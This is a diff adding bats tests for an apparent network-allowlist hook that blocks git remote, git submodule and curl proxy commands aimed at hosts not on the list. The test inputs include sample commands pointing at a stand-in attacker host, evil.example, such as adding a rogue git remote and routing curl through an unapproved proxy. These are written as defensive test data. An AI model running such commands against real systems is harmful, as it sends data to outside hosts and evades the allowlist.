@@ -460,6 +460,98 @@ _call_hook_other() {
   echo "$output" | jq -e '.decision == "allow"'
 }
 
+@test "AC-2 (Codex CR8-B): 'git remote update <name>' fail-CLOSED (network sub-sub)" {
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'git remote update origin'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR8-B): 'git remote show <name>' fail-CLOSED (network sub-sub)" {
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'git remote show origin'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR8-B): 'git remote add evil https://evil.example/repo' blocks (URL inspected at add)" {
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'git remote add evil https://evil.example/repo.git'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
+}
+
+@test "AC-2 (Codex CR8-B): 'git remote add allowed https://github.com/x' (allowlisted) → allow" {
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'git remote add allowed https://github.com/foo/bar.git'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+@test "AC-2 (Codex CR8-B): 'git remote rm origin' (local) passes through" {
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'git remote rm origin'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+@test "AC-2 (Codex CR8-B): 'git submodule update --remote' fail-CLOSED (network)" {
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'git submodule update --remote'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR8-B): 'git submodule add https://evil/x' blocks unallowlisted URL" {
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'git submodule add https://evil.example/repo.git path/to/sub'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR8-B): 'git submodule init' (local) passes through" {
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'git submodule init'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+# ---------------------------------------------------------------------------
+# Codex R8 CR8-A: curl proxy flags must validate the proxy host
+# ---------------------------------------------------------------------------
+
+@test "AC-2 (Codex CR8-A): 'curl --proxy=http://evil https://allowed' blocks proxy host" {
+  # The URL is allowlisted but the proxy isn't — connection goes to
+  # proxy first → exfil risk → block.
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'curl --proxy=http://evil.example:8080 https://api.github.com/x'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
+}
+
+@test "AC-2 (Codex CR8-A): 'curl --proxy http://evil https://allowed' (spaced) blocks" {
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'curl --proxy http://evil.example:8080 https://api.github.com/x'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR8-A): 'curl -x evil.example:8080 https://allowed' (bare host:port) blocks" {
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'curl -x evil.example:8080 https://api.github.com/x'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR8-A): 'curl --proxy=http://allowed-proxy https://allowed' allows both" {
+  printf '%s\n' 'api.github.com' 'proxy.example' > "$ALLOWLIST"
+  run _call_hook_bash 'curl --proxy=http://proxy.example:8080 https://api.github.com/x'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
 @test "AC-2 (Copilot R2): 'git archive HEAD -o /tmp/out.tar' (no --remote) passes through" {
   # Local archive form. Must NOT be blocked.
   echo 'github.com' > "$ALLOWLIST"
